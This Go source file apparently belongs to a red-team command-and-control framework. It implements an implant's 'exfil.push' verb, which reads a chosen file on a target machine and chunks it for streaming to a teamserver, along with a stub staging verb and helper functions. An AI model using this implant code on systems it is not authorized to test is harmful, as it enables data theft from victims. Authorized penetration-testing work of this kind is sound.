package exec

// exfil.go holds the exfil.* verbs the reference implant advertises
// (architecture.md Sec 10.1, ADR 0004). exfil.push streams a file off the
// target to the teamserver as ExfilChunk frames, terminating at the artifact
// store scoped to the engagement; exfil.stage reports what the implant has
// staged locally for a follow-up push. The reference implant has no durable
// staging area -- files are read on demand -- so exfil.stage reports an empty
// manifest, the documented behavior for an implant that pushes rather than
// stages.
//
// Argument shape:
//
//	exfil.push  <name> <path>     name identifies the artifact; path is read
//	exfil.push  <name>            name only, no payload to stream
//	exfil.stage  [<name>]         optional name filter; lists staged entries
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test.

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/cw/rod/implant/rodpb"
)

// exfilPush streams a file off the target as ExfilChunk frames. The name
// identifies the artifact in the teamserver's store; the path is the file to
// read. A missing path or a directory is Failed; a successful read returns
// Succeeded with a manifest line and the chunk slice populated. The beacon
// loop writes the TaskResult first, then iterates the chunks as ExfilChunk
// frames (architecture.md Sec 10.1 exfil, Sec 11).
func (r *Runner) exfilPush(_ context.Context, arguments string) (rodpb.TaskOutcome, string, []rodpb.ExfilChunk) {
	name, path, ok := parsePushArgs(arguments)
	if !ok {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"exfil.push expects '<name> <path>'", nil
	}
	if path == "" {
		// Name-only invocation: the operator is announcing an artifact by name
		// without streaming bytes yet. Report Succeeded with a marker so the
		// audit trail shows the intent; no chunks cross the wire.
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
			"staged " + name + " (no payload streamed)", nil
	}

	info, err := os.Stat(path)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"stat " + path + ": " + err.Error(), nil
	}
	if info.IsDir() {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"exfil.push refuses to stream a directory: " + path, nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"read " + path + ": " + err.Error(), nil
	}

	contentType := sniffContentType(path, data)
	chunks := chunkFile(name, contentType, data)
	manifest := fmt.Sprintf("pushed %s: %d bytes, %d chunks", name, len(data), len(chunks))
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, manifest, chunks
}

// exfilStage reports what the implant has staged locally for a follow-up push.
// The reference implant has no durable staging area -- files are read on
// demand by collect.file and exfil.push -- so this always reports an empty
// manifest. It exists as the documented counterpart to exfil.push so the
// capability registry stays complete and operators can probe the verb without
// a Failed outcome.
func (r *Runner) exfilStage(_ context.Context, _ string) (rodpb.TaskOutcome, string, []rodpb.ExfilChunk) {
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
		"(no local staging area; use collect.file or exfil.push to stream on demand)", nil
}

// parsePushArgs splits "<name> <path>" into the two parts. The path is the
// remainder of the line so it may contain spaces; only the first token is the
// name. Returns ok=false when no fields are present. A single field is valid
// (name-only) and yields an empty path.
func parsePushArgs(arguments string) (name, path string, ok bool) {
	fields := strings.Fields(arguments)
	if len(fields) == 0 {
		return "", "", false
	}
	if len(fields) == 1 {
		return fields[0], "", true
	}
	return fields[0], strings.Join(fields[1:], " "), true
}

// sniffContentType returns a best-effort content type for the streamed
// artifact from its extension, defaulting to application/octet-stream. It is
// intentionally conservative: the operator asked for the file, not a parsed
// rendering, so unknown extensions stay octet-stream rather than guessing.
func sniffContentType(path string, _ []byte) string {
	switch strings.ToLower(filepath.Ext(path)) {
	case ".txt", ".log":
		return "text/plain"
	case ".json":
		return "application/json"
	case ".xml":
		return "application/xml"
	case ".csv":
		return "text/csv"
	case ".html", ".htm":
		return "text/html"
	case ".png":
		return "image/png"
	case ".jpg", ".jpeg":
		return "image/jpeg"
	case ".pdf":
		return "application/pdf"
	}
	return "application/octet-stream"
}
